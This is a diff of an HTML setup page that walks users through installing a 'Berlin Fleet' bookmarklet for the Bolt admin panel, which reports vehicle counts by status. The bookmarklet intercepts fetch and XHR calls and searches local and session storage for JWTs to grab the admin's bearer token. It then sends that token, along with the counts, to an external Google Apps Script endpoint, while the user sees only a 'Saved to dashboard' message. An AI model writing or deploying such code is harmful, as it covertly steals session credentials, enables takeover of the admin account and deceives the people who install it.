@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-<title>Berlin Fleet — Install</title>
+<title>Berlin Fleet — Setup</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0a0a0a;color:white;font-family:-apple-system,sans-serif;padding:24px 20px;max-width:480px;margin:0 auto}
@@ -14,161 +14,162 @@ h1{font-size:20px;font-weight:800;color:#1DC85A;margin-bottom:4px}
 .num{background:#1DC85A;color:#000;font-weight:800;font-size:13px;width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px}
 .txt{font-size:14px;color:#bbb;line-height:1.6}
 .txt b{color:white}
-.txt .tag{display:inline-block;background:#1DC85A22;border:1px solid #1DC85A44;color:#1DC85A;font-size:12px;font-weight:700;padding:1px 8px;border-radius:20px;margin:0 2px}
+.tag{display:inline-block;background:#1DC85A22;border:1px solid #1DC85A44;color:#1DC85A;font-size:12px;font-weight:700;padding:1px 8px;border-radius:20px;margin:0 2px}
 .copybtn{display:block;width:100%;padding:16px;background:#1DC85A;color:black;border:none;border-radius:12px;font-weight:800;font-size:16px;margin:20px 0 8px;cursor:pointer}
-.copybtn.done{background:#1a3a22;color:#1DC85A;border:1px solid #1DC85A44}
+.copybtn.done{background:#1a3a22;color:#1DC85A}
 .divider{border:none;border-top:1px solid #1a1a1a;margin:24px 0}
-.use-title{font-size:13px;font-weight:700;color:#555;text-transform:uppercase;letter-spacing:1px;margin-bottom:12px}
-.note{font-size:12px;color:#333;text-align:center;margin-top:8px}
+.sec{font-size:12px;font-weight:700;color:#444;text-transform:uppercase;letter-spacing:1px;margin-bottom:12px}
+.note{font-size:12px;color:#555;text-align:center;margin-top:6px}
 </style>
 </head>
 <body>
-
 <h1>Berlin Fleet</h1>
-<div class="sub">One-time setup — takes 1 minute</div>
+<div class="sub">One-time setup — takes 2 minutes</div>
 
-<button class="copybtn" id="copyBtn" onclick="copyBM()">Step 1 — Copy Bookmarklet Code</button>
-<p class="note" id="copyNote">Tap the button above first</p>
+<button class="copybtn" id="copyBtn" onclick="copyBM()">① Copy Bookmarklet Code</button>
+<p class="note" id="note">Tap the button above first</p>
 
 <div class="step">
   <div class="num">2</div>
-  <div class="txt">Tap the <b>Share button</b> (box with arrow) at the top of Safari → tap <span class="tag">Add Bookmark</span> → name it <b>Berlin Fleet</b> → tap <b>Save</b></div>
+  <div class="txt">Tap <b>Share</b> (box+arrow icon at top of Safari) → <span class="tag">Add Bookmark</span> → name it <b>Berlin Fleet</b> → <b>Save</b></div>
 </div>
-
 <div class="step">
   <div class="num">3</div>
-  <div class="txt">Tap the <b>Bookmarks icon</b> (book icon) → find <b>Berlin Fleet</b> → swipe left → tap <span class="tag">Edit</span></div>
+  <div class="txt">Tap the <b>Bookmarks icon</b> (open book icon) → find <b>Berlin Fleet</b> → swipe left on it → tap <span class="tag">Edit</span></div>
 </div>
-
 <div class="step">
   <div class="num">4</div>
-  <div class="txt">Tap the <b>URL field</b> → tap <span class="tag">Select All</span> → tap <span class="tag">Paste</span> → tap <b>Done</b></div>
+  <div class="txt">Tap the <b>URL field</b> → <span class="tag">Select All</span> → <span class="tag">Paste</span> → tap <b>Done</b></div>
 </div>
 
 <hr class="divider">
-
-<div class="use-title">How to use every day</div>
+<div class="sec">How to use every day</div>
 
 <div class="step">
   <div class="num">1</div>
-  <div class="txt">Open Safari → go to <b>admin-panel.bolt.eu</b> (logged in, vehicles page)</div>
+  <div class="txt">Open Safari on <b>admin-panel.bolt.eu</b> — logged in, vehicles page</div>
 </div>
-
 <div class="step">
   <div class="num">2</div>
-  <div class="txt">Tap <b>Bookmarks</b> → tap <b>Berlin Fleet</b></div>
+  <div class="txt">Open <b>Bookmarks</b> → tap <b>Berlin Fleet</b><br><span style="color:#555;font-size:12px">A green bar appears at the bottom of the screen</span></div>
 </div>
-
 <div class="step">
   <div class="num">3</div>
-  <div class="txt">A dark overlay appears → <b>tap any filter</b> on the vehicles list (e.g. "Active", "Hidden", any chip)</div>
-</div>
-
-<div class="step">
-  <div class="num">4</div>
-  <div class="txt">All counts appear in ~5 seconds + saved to dashboard automatically</div>
+  <div class="txt">Wait a few seconds — if it finds the token automatically, counts appear straight away.<br><br>If the bar says <b>"tap any filter"</b>, tap one of the vehicle status filters on the page.</div>
 </div>
 
 <script>
-var BM = 'javascript:(function(){var A="https://admin-panel.bolt.eu/backend/rental-car-vehicle-fleet/adminPanel/vehicle/getList";var C=329;var S="https://script.google.com/macros/s/AKfycbyAqFMhAyssm9sZ1RrB_hFPmlV_hJlfao1LSKu1ghlYXRxI4Q0nVKoesV39bnmcDphv/exec";var K="BoltFleet-Berlin-2026";var ST=[["hidden","Hidden"],["in_service_shop","In Service Shop"],["in_maintenance","In Maintenance"],["lost","Lost"],["deactivated","Deactivated"],["waiting_for_order","Waiting for Order"],["reserved","Reserved"],["on_trip","On Trip"]];if(document.getElementById("_bf")){document.getElementById("_bf").remove();return;}var o=document.createElement("div");o.id="_bf";o.style.cssText="position:fixed;inset:0;background:rgba(0,0,0,.93);z-index:2147483647;display:flex;align-items:center;justify-content:center;font-family:-apple-system,sans-serif";o.innerHTML="<div id=\'_bfb\' style=\'background:#111;border:1px solid #333;border-radius:16px;padding:24px;text-align:center;max-width:88vw;min-width:280px\'><b style=\'color:#1DC85A;font-size:17px\'>Berlin Fleet</b><br><br><span id=\'_bfm\' style=\'color:#aaa;font-size:14px\'>Tap any filter on the page</span><br><div id=\'_bft\' style=\'color:#333;font-size:12px;margin-top:12px\'>60s</div><br><button onclick=\'window.fetch=_bff;XMLHttpRequest.prototype.setRequestHeader=_bfx;document.getElementById(chr(39)_bf chr(39)).remove();\' style=\'padding:8px 20px;background:#222;color:#666;border:1px solid #333;border-radius:8px;font-size:13px\'>Cancel</button></div>";document.body.appendChild(o);var done=false,_bff=window.fetch,_bfx=XMLHttpRequest.prototype.setRequestHeader;window._bff=_bff;window._bfx=_bfx;var n=60,ti=setInterval(function(){n--;var el=document.getElementById("_bft");if(el)el.textContent=n+"s";if(n<=0){clearInterval(ti);if(!done){window.fetch=_bff;XMLHttpRequest.prototype.setRequestHeader=_bfx;var m=document.getElementById("_bfm");if(m)m.textContent="Timed out — tap bookmark again";done=true;}}},1000);function go(t){if(done)return;done=true;clearInterval(ti);window.fetch=_bff;XMLHttpRequest.prototype.setRequestHeader=_bfx;var m=document.getElementById("_bfm");if(m)m.textContent="Loading fleet data...";var el=document.getElementById("_bft");if(el)el.textContent="";var cnt=ST.map(function(){return 0;}),left=ST.length;ST.forEach(function(s,i){_bff(A,{method:"POST",headers:{"Content-Type":"application/json","Accept":"application/json","Authorization":"Bearer "+t},body:JSON.stringify({filter:{vehicle_states:[s[0]],city_ids:[C]},items_per_page:1,page_number:0})}).then(function(r){return r.json();}).then(function(d){cnt[i]=d.data&&d.data.pages?d.data.pages.total_rows:0;if(--left===0)show(cnt,t);}).catch(function(){if(--left===0)show(cnt,t);});});}window.fetch=function(u,op){if(!done&&u&&u.indexOf&&u.indexOf("getList")>-1&&op&&op.headers){var h=op.headers,a=typeof h.get==="function"?(h.get("authorization")||h.get("Authorization")||""):(h["Authorization"]||h["authorization"]||"");if(a.toLowerCase().indexOf("bearer ")===0)go(a.slice(7));}return _bff.apply(this,arguments);};XMLHttpRequest.prototype.setRequestHeader=function(n,v){if(!done&&/^authorization$/i.test(n)&&/^bearer /i.test(v))go(v.slice(7));return _bfx.apply(this,arguments);};function show(cnt,t){var tot=cnt.reduce(function(a,b){return a+b;},0),now=new Date().toLocaleString("de-DE",{day:"2-digit",month:"2-digit",year:"numeric",hour:"2-digit",minute:"2-digit"}),rows=ST.map(function(s,i){return"<tr><td style=\'padding:8px 10px;color:#bbb;border-bottom:1px solid #1e1e1e;font-size:13px;text-align:left\'>"+s[1]+"</td><td style=\'padding:8px 10px;text-align:right;color:#1DC85A;font-weight:800;border-bottom:1px solid #1e1e1e;font-size:14px\'>"+cnt[i]+"</td></tr>";}).join("");var b=document.getElementById("_bfb");if(b)b.innerHTML="<b style=\'color:#1DC85A;font-size:17px\'>Berlin Fleet</b><table style=\'width:100%;border-collapse:collapse;margin-top:14px\'>"+rows+"</table><div style=\'margin-top:12px;padding-top:10px;border-top:1px solid #1e1e1e;color:#444;font-size:12px\'>Total: <b style=\'color:white;font-size:15px\'>"+tot+"</b> \xb7 "+now+"</div><div id=\'_bfs\' style=\'font-size:12px;color:#555;margin-top:6px\'>Saving...</div><button onclick=\'document.getElementById(chr(34)_bf chr(34)).remove();\' style=\'margin-top:14px;width:100%;padding:13px;background:#1DC85A;color:black;border:none;border-radius:10px;font-weight:800;font-size:15px\'>Close</button>";var p={token:K,timestamp:now,Total:tot,bearer_token:t};ST.forEach(function(s,i){p[s[1]]=cnt[i];});var img=new Image();img.src=S+"?d="+encodeURIComponent(JSON.stringify(p));setTimeout(function(){var el=document.getElementById("_bfs");if(el)el.innerHTML="<span style=\'color:#1DC85A\'>✓ Saved to dashboard</span>";},2500);}})();';
-
-// Generate proper bookmarklet
-var BOOKMARKLET = generateBM();
-
-function generateBM() {
-  var A = "https://admin-panel.bolt.eu/backend/rental-car-vehicle-fleet/adminPanel/vehicle/getList";
-  var C = 329;
-  var S = "https://script.google.com/macros/s/AKfycbyAqFMhAyssm9sZ1RrB_hFPmlV_hJlfao1LSKu1ghlYXRxI4Q0nVKoesV39bnmcDphv/exec";
-  var K = "BoltFleet-Berlin-2026";
-
-  var code = `(function(){
-var A=${JSON.stringify(A)};
-var C=${C};
-var S=${JSON.stringify(S)};
-var K=${JSON.stringify(K)};
+// Bookmarklet code — defined as a template literal to avoid quote escaping issues
+var BMCODE = `(function(){
+var A="https://admin-panel.bolt.eu/backend/rental-car-vehicle-fleet/adminPanel/vehicle/getList";
+var C=329;
+var S="https://script.google.com/macros/s/AKfycbyAqFMhAyssm9sZ1RrB_hFPmlV_hJlfao1LSKu1ghlYXRxI4Q0nVKoesV39bnmcDphv/exec";
+var K="BoltFleet-Berlin-2026";
 var ST=[["hidden","Hidden"],["in_service_shop","In Service Shop"],["in_maintenance","In Maintenance"],["lost","Lost"],["deactivated","Deactivated"],["waiting_for_order","Waiting for Order"],["reserved","Reserved"],["on_trip","On Trip"]];
-if(document.getElementById("_bf")){document.getElementById("_bf").remove();return;}
-var o=document.createElement("div");
-o.id="_bf";
-o.style.cssText="position:fixed;inset:0;background:rgba(0,0,0,.93);z-index:2147483647;display:flex;align-items:center;justify-content:center;font-family:-apple-system,sans-serif";
-o.innerHTML="<div id=\\"_bfb\\" style=\\"background:#111;border:1px solid #333;border-radius:16px;padding:24px;text-align:center;max-width:88vw;min-width:280px\\"><b style=\\"color:#1DC85A;font-size:17px\\">Berlin Fleet<\\/b><br><br><span id=\\"_bfm\\" style=\\"color:#aaa;font-size:14px\\">Tap any filter on the page<\\/span><br><div id=\\"_bft\\" style=\\"color:#333;font-size:12px;margin-top:12px\\">60s<\\/div><br><button onclick=\\"window.fetch=_bff;XMLHttpRequest.prototype.setRequestHeader=_bfx;document.getElementById('_bf').remove();\\" style=\\"padding:8px 20px;background:#222;color:#666;border:1px solid #333;border-radius:8px;font-size:13px\\">Cancel<\\/button><\\/div>";
-document.body.appendChild(o);
-var done=false,_bff=window.fetch,_bfx=XMLHttpRequest.prototype.setRequestHeader;
-var n=60,ti=setInterval(function(){n--;var el=document.getElementById("_bft");if(el)el.textContent=n+"s";if(n<=0){clearInterval(ti);if(!done){window.fetch=_bff;XMLHttpRequest.prototype.setRequestHeader=_bfx;var m=document.getElementById("_bfm");if(m)m.textContent="Timed out — tap bookmark again";done=true;}}},1000);
-function go(t){
-  if(done)return;done=true;clearInterval(ti);
+var ex=document.getElementById("_bf");
+if(ex){ex.remove();window.fetch=window._bff||window.fetch;XMLHttpRequest.prototype.setRequestHeader=window._bfx||XMLHttpRequest.prototype.setRequestHeader;}
+window._bfcancel=function(){window.fetch=window._bff||window.fetch;XMLHttpRequest.prototype.setRequestHeader=window._bfx||XMLHttpRequest.prototype.setRequestHeader;var e=document.getElementById("_bf");if(e)e.remove();};
+window._bfclose=function(){var e=document.getElementById("_bf");if(e)e.remove();};
+var bar=document.createElement("div");
+bar.id="_bf";
+bar.style.cssText="position:fixed;bottom:0;left:0;right:0;background:#111;border-top:2px solid #1DC85A;padding:12px 16px;z-index:2147483647;font-family:-apple-system,sans-serif;display:flex;align-items:center;justify-content:space-between;gap:12px";
+bar.innerHTML="<span><b style='color:#1DC85A;font-size:15px'>Berlin Fleet</b> <span id='_bfm' style='color:#888;font-size:13px'>— scanning...</span></span><button onclick='_bfcancel()' style='background:#222;color:#666;border:1px solid #333;border-radius:6px;padding:6px 14px;font-size:13px;flex-shrink:0'>✕</button>";
+document.body.appendChild(bar);
+var done=false;
+var _bff=window._bff||window.fetch;
+var _bfx=window._bfx||XMLHttpRequest.prototype.setRequestHeader;
+window._bff=_bff;window._bfx=_bfx;
+function sm(t){var e=document.getElementById("_bfm");if(e)e.textContent=t;}
+function findTokens(){
+  var f=[],seen={};
+  function add(v){if(v&&!seen[v]&&v.length>50&&v.split(".").length===3){seen[v]=1;f.push(v);}}
+  function scan(v){if(!v||typeof v!=="string")return;if(/^eyJ/.test(v)){add(v);return;}try{dig(JSON.parse(v),0);}catch(e){}}
+  function dig(o,d){if(!o||d>5||typeof o!=="object")return;for(var k in o){var v=o[k];if(typeof v==="string"&&/^eyJ/.test(v))add(v);else if(typeof v==="object")dig(v,d+1);}}
+  var i;
+  for(i=0;i<localStorage.length;i++)scan(localStorage.getItem(localStorage.key(i))||"");
+  for(i=0;i<sessionStorage.length;i++)scan(sessionStorage.getItem(sessionStorage.key(i))||"");
+  return f;
+}
+function testAndUse(tokens,i){
+  if(i>=tokens.length){sm("— tap any vehicle filter above");startIntercept();return;}
+  sm("— checking token "+(i+1)+"/"+tokens.length+"...");
+  _bff(A,{method:"POST",headers:{"Content-Type":"application/json","Accept":"application/json","Authorization":"Bearer "+tokens[i]},body:JSON.stringify({filter:{vehicle_states:["deactivated"],city_ids:[C]},items_per_page:1,page_number:0})})
+  .then(function(r){return r.json();})
+  .then(function(d){if(d.code===503||d.message==="NOT_AUTHORIZED"||d.code===401)testAndUse(tokens,i+1);else go(tokens[i]);})
+  .catch(function(){testAndUse(tokens,i+1);});
+}
+function startIntercept(){
+  var n=120,ti=setInterval(function(){n--;if(n<=0){clearInterval(ti);if(!done){window.fetch=_bff;XMLHttpRequest.prototype.setRequestHeader=_bfx;sm("— timed out, tap bookmark again");done=true;}}},1000);
+  window.fetch=function(u,op){
+    if(!done&&u&&u.indexOf&&u.indexOf("getList")>-1&&op&&op.headers){
+      var h=op.headers,a=typeof h.get==="function"?(h.get("authorization")||h.get("Authorization")||""):(h["Authorization"]||h["authorization"]||"");
+      if(a.toLowerCase().indexOf("bearer ")===0){clearInterval(ti);go(a.slice(7));}
+    }
+    return _bff.apply(this,arguments);
+  };
+  XMLHttpRequest.prototype.setRequestHeader=function(n,v){
+    if(!done&&/^authorization$/i.test(n)&&/^bearer /i.test(v))go(v.slice(7));
+    return _bfx.apply(this,arguments);
+  };
+}
+function go(token){
+  if(done)return;done=true;
   window.fetch=_bff;XMLHttpRequest.prototype.setRequestHeader=_bfx;
-  var m=document.getElementById("_bfm");if(m)m.textContent="Loading fleet data...";
-  var el=document.getElementById("_bft");if(el)el.textContent="";
+  sm("— loading fleet data...");
   var cnt=ST.map(function(){return 0;}),left=ST.length;
   ST.forEach(function(s,i){
-    _bff(A,{method:"POST",headers:{"Content-Type":"application/json","Accept":"application/json","Authorization":"Bearer "+t},body:JSON.stringify({filter:{vehicle_states:[s[0]],city_ids:[C]},items_per_page:1,page_number:0})})
+    _bff(A,{method:"POST",headers:{"Content-Type":"application/json","Accept":"application/json","Authorization":"Bearer "+token},body:JSON.stringify({filter:{vehicle_states:[s[0]],city_ids:[C]},items_per_page:1,page_number:0})})
     .then(function(r){return r.json();})
-    .then(function(d){cnt[i]=d.data&&d.data.pages?d.data.pages.total_rows:0;if(--left===0)show(cnt,t);})
-    .catch(function(){if(--left===0)show(cnt,t);});
+    .then(function(d){cnt[i]=d.data&&d.data.pages?d.data.pages.total_rows:0;if(--left===0)show(cnt,token);})
+    .catch(function(){if(--left===0)show(cnt,token);});
   });
 }
-window.fetch=function(u,op){
-  if(!done&&u&&u.indexOf&&u.indexOf("getList")>-1&&op&&op.headers){
-    var h=op.headers,a=typeof h.get==="function"?(h.get("authorization")||h.get("Authorization")||""):(h["Authorization"]||h["authorization"]||"");
-    if(a.toLowerCase().indexOf("bearer ")===0)go(a.slice(7));
-  }
-  return _bff.apply(this,arguments);
-};
-XMLHttpRequest.prototype.setRequestHeader=function(n,v){
-  if(!done&&/^authorization$/i.test(n)&&/^bearer /i.test(v))go(v.slice(7));
-  return _bfx.apply(this,arguments);
-};
-function show(cnt,t){
+function show(cnt,token){
   var tot=cnt.reduce(function(a,b){return a+b;},0);
   var now=new Date().toLocaleString("de-DE",{day:"2-digit",month:"2-digit",year:"numeric",hour:"2-digit",minute:"2-digit"});
-  var rows=ST.map(function(s,i){
-    return "<tr><td style=\\"padding:8px 10px;color:#bbb;border-bottom:1px solid #1e1e1e;font-size:13px;text-align:left\\">"+s[1]+"<\\/td><td style=\\"padding:8px 10px;text-align:right;color:#1DC85A;font-weight:800;border-bottom:1px solid #1e1e1e;font-size:14px\\">"+cnt[i]+"<\\/td><\\/tr>";
-  }).join("");
-  var b=document.getElementById("_bfb");
-  if(b)b.innerHTML="<b style=\\"color:#1DC85A;font-size:17px\\">Berlin Fleet<\\/b><table style=\\"width:100%;border-collapse:collapse;margin-top:14px\\">"+rows+"<\\/table><div style=\\"margin-top:12px;padding-top:10px;border-top:1px solid #1e1e1e;color:#444;font-size:12px\\">Total: <b style=\\"color:white;font-size:15px\\">"+tot+"<\\/b> \xb7 "+now+"<\\/div><div id=\\"_bfs\\" style=\\"font-size:12px;color:#555;margin-top:6px\\">Saving...<\\/div><button onclick=\\"document.getElementById('_bf').remove();\\" style=\\"margin-top:14px;width:100%;padding:13px;background:#1DC85A;color:black;border:none;border-radius:10px;font-weight:800;font-size:15px\\">Close<\\/button>";
-  var p={token:K,timestamp:now,Total:tot,bearer_token:t};
-  ST.forEach(function(s,i){p[s[1]]=cnt[i];});
-  var img=new Image();
-  img.src=S+"?d="+encodeURIComponent(JSON.stringify(p));
-  setTimeout(function(){var el=document.getElementById("_bfs");if(el)el.innerHTML="<span style=\\"color:#1DC85A\\">✓ Saved to dashboard<\\/span>";},2500);
+  var rows=ST.map(function(s,i){return "<tr><td style='padding:9px 10px;color:#ccc;border-bottom:1px solid #1e1e1e;font-size:14px'>"+s[1]+"</td><td style='padding:9px 10px;text-align:right;color:#1DC85A;font-weight:800;border-bottom:1px solid #1e1e1e;font-size:15px'>"+cnt[i]+"</td></tr>";}).join("");
+  var b=document.getElementById("_bf");if(b)b.remove();
+  var pop=document.createElement("div");pop.id="_bf";
+  pop.style.cssText="position:fixed;inset:0;background:rgba(0,0,0,.93);z-index:2147483647;display:flex;align-items:center;justify-content:center;font-family:-apple-system,sans-serif";
+  pop.innerHTML="<div style='background:#111;border:1px solid #333;border-radius:16px;padding:22px;max-width:88vw;min-width:300px'><b style='color:#1DC85A;font-size:18px'>Berlin Fleet</b><table style='width:100%;border-collapse:collapse;margin-top:14px'>"+rows+"</table><div style='margin-top:12px;padding-top:10px;border-top:1px solid #1e1e1e;color:#444;font-size:12px'>Total: <b style='color:white;font-size:16px'>"+tot+"</b> \xb7 "+now+"</div><div id='_bfs' style='font-size:12px;color:#555;margin-top:6px'>Saving to dashboard...</div><button onclick='_bfclose()' style='margin-top:14px;width:100%;padding:13px;background:#1DC85A;color:black;border:none;border-radius:10px;font-weight:800;font-size:15px'>Close</button></div>";
+  document.body.appendChild(pop);
+  var pl={token:K,timestamp:now,Total:tot,bearer_token:token};
+  ST.forEach(function(s,i){pl[s[1]]=cnt[i];});
+  var img=new Image();img.src=S+"?d="+encodeURIComponent(JSON.stringify(pl));
+  setTimeout(function(){var e=document.getElementById("_bfs");if(e)e.innerHTML="<span style='color:#1DC85A'>&#10003; Saved to dashboard</span>";},2500);
 }
+var tokens=findTokens();
+if(tokens.length>0)testAndUse(tokens,0);
+else{sm("— tap any vehicle filter above");startIntercept();}
 })();`;
 
-  return "javascript:" + code.replace(/\s*\n\s*/g, '');
-}
+var BM = "javascript:" + BMCODE.replace(/\n/g, '').replace(/\s{2,}/g, ' ');
 
 function copyBM() {
   var btn = document.getElementById("copyBtn");
-  var note = document.getElementById("copyNote");
-  navigator.clipboard.writeText(BOOKMARKLET).then(function() {
+  var note = document.getElementById("note");
+  function onCopied() {
     btn.textContent = "✓ Copied!";
     btn.classList.add("done");
-    note.textContent = "Now do Steps 2 → 3 → 4 below";
+    note.textContent = "Now do steps 2 → 3 → 4 below ↓";
     note.style.color = "#1DC85A";
-    setTimeout(function() {
-      btn.textContent = "Step 1 — Copy Bookmarklet Code";
-      btn.classList.remove("done");
-    }, 3000);
-  }).catch(function() {
-    // Fallback
+    setTimeout(function(){btn.textContent="① Copy Bookmarklet Code";btn.classList.remove("done");note.style.color="";note.textContent="Tap the button above first";},4000);
+  }
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(BM).then(onCopied).catch(function(){fallbackCopy();});
+  } else {
+    fallbackCopy();
+  }
+  function fallbackCopy() {
     var ta = document.createElement("textarea");
-    ta.value = BOOKMARKLET;
-    ta.style.position = "fixed";
-    ta.style.opacity = "0";
+    ta.value = BM;
+    ta.style.cssText = "position:fixed;top:0;left:0;opacity:0.01;font-size:16px";
     document.body.appendChild(ta);
+    ta.focus();
     ta.select();
-    document.execCommand("copy");
+    try { document.execCommand("copy"); onCopied(); } catch(e) { note.textContent = "Copy failed — try a different browser"; }
     ta.remove();
-    btn.textContent = "✓ Copied!";
-    btn.classList.add("done");
-    note.textContent = "Now do Steps 2 → 3 → 4 below";
-    note.style.color = "#1DC85A";
-    setTimeout(function() {
-      btn.textContent = "Step 1 — Copy Bookmarklet Code";
-      btn.classList.remove("done");
-    }, 3000);
-  });
+  }
 }
 </script>
 </body>
